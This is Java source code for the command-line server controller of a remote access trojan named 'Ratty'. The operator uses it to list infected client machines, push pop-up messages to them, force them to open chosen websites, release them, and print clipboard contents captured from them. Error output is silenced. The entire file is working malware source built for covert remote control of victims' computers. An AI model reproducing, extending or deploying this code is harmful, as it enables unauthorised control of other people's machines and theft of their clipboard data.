package de.sogomn.rat.server.cmd;

import static de.sogomn.rat.Ratty.LANGUAGE;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.cmd.CommandLineReader.Command;

public final class RattyCmdController extends AbstractRattyController implements ICommandLineListener {
	
	private CommandLineReader reader;
	
	private static final String FREE = "Free";
	private static final String EXIT = "Exit";
	private static final String LIST = "List";
	private static final String POPUP = "Popup";
	private static final String HELP = "Help";
	private static final String WEBSITE = "WEBSITE";
	
	private static final String START_MESSAGE = LANGUAGE.getString("cmd.start");
	private static final String HELP_MESSAGE = LANGUAGE.getString("cmd.help");
	private static final String INVALID_COMMAND = LANGUAGE.getString("cmd.invalid");
	private static final String EMPTY_LIST_MESSAGE = LANGUAGE.getString("cmd.empty_list");
	private static final String CLIENT_CONNECTED_MESSAGE = LANGUAGE.getString("cmd.connected");
	private static final String CLIENT_DISCONNECTED_MESSAGE = LANGUAGE.getString("cmd.disconnected");
	
	public RattyCmdController() {
		reader = new CommandLineReader();
		
		System.setErr(new PrintStream(new OutputStream() {
			@Override
			public void write(final int b) throws IOException {
				//...
			}
		}));
		
		System.out.println(START_MESSAGE);
		System.out.println();
		
		reader.addListener(this);
		reader.start();
	}
	
	private int parseIndexSafely(final String string) {
		if (string == null) {
			return -1;
		}
		
		try {
			final int number = Integer.parseInt(string);
			
			return number;
		} catch (final NumberFormatException ex) {
			return -1;
		}
	}
	
	private ActiveConnection getConnectionByIndex(final int index) {
		if (index < 0 || index > connections.size() - 1) {
			return null;
		}
		
		return connections.get(index);
	}
	
	private ActiveConnection getConnectionByAddress(final String address) {
		if (address == null) {
			return null;
		}
		
		for (final ActiveConnection connection : connections) {
			final String connectionAddress = connection.getAddress();
			
			if (connectionAddress.equals(address)) {
				return connection;
			}
		}
		
		return null;
	}
	
	private ActiveConnection getConnection(final String input) {
		if (input == null) {
			return null;
		}
		
		final int index = parseIndexSafely(input);
		final ActiveConnection connection;
		
		if (index != -1) {
			connection = getConnectionByIndex(index);
		} else {
			connection = getConnectionByAddress(input);
		}
		
		return connection;
	}
	
	/*
	 * ==================================================
	 * HANDLING COMMANDS
	 * ==================================================
	 */
	
	private boolean freeClient(final Command command) {
		final String input = command.argument(0);
		final ActiveConnection connection = getConnection(input);
		
		if (connection != null) {
			final FreePacket packet = new FreePacket();
			
			connection.addPacket(packet);
			
			return true;
		}
		
		return false;
	}
	
	private void listConnections() {
		if (connections.isEmpty()) {
			System.out.println(EMPTY_LIST_MESSAGE);
		}
		
		connections.stream().forEach(connection -> {
			final int index = connections.indexOf(connection);
			
			System.out.println(index + ": " + connection.getAddress());
		});
	}
	
	private boolean sendPopup(final Command command) {
		final String connectionInput = command.argument(0);
		final ActiveConnection connection = getConnection(connectionInput);
		final String message = command.argument(1);
		
		if (connection != null && message != null) {
			final PopupPacket packet = new PopupPacket(message);
			
			connection.addPacket(packet);
			
			return true;
		}
		
		return false;
	}
	
	private boolean openWebsite(final Command command) {
		final String connectionInput = command.argument(0);
		final ActiveConnection connection = getConnection(connectionInput);
		final String address = command.argument(1);
		
		if (connection != null && address != null) {
			final WebsitePacket packet = new WebsitePacket(address);
			
			connection.addPacket(packet);
			
			return true;
		}
		
		return false;
	}
	
	/*
	 * ==================================================
	 * HANDLING PACKETS
	 * ==================================================
	 */
	
	private void handleClipboardPacket(final ClipboardPacket packet) {
		final String content = packet.getClipbordContent();
		
		System.out.println(content);
	}
	
	/*
	 * ==================================================
	 * HANDLING END
	 * ==================================================
	 */
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		if (clazz == ClipboardPacket.class) {
			final ClipboardPacket clipboard = (ClipboardPacket)packet;
			
			handleClipboardPacket(clipboard);
		}
	}
	
	@Override
	public void commandInput(final Command command) {
		boolean successful = true;
		
		if (command.equals(EXIT)) {
			System.exit(0);
		} else if (command.equals(FREE)) {
			successful = freeClient(command);
		} else if (command.equals(LIST)) {
			listConnections();
		} else if (command.equals(POPUP)) {
			successful = sendPopup(command);
		} else if (command.equals(HELP)) {
			System.out.println(HELP_MESSAGE);
		} else if (command.equals(WEBSITE)) {
			successful = openWebsite(command);
		} else {
			successful = false;
		}
		
		if (!successful) {
			System.out.println(INVALID_COMMAND);
			
		}
		
		System.out.println();
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		super.connected(server, connection);
		
		System.out.println(CLIENT_CONNECTED_MESSAGE);
		System.out.println();
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		super.disconnected(connection);
		
		System.out.println(CLIENT_DISCONNECTED_MESSAGE);
		System.out.println();
	}
	
}
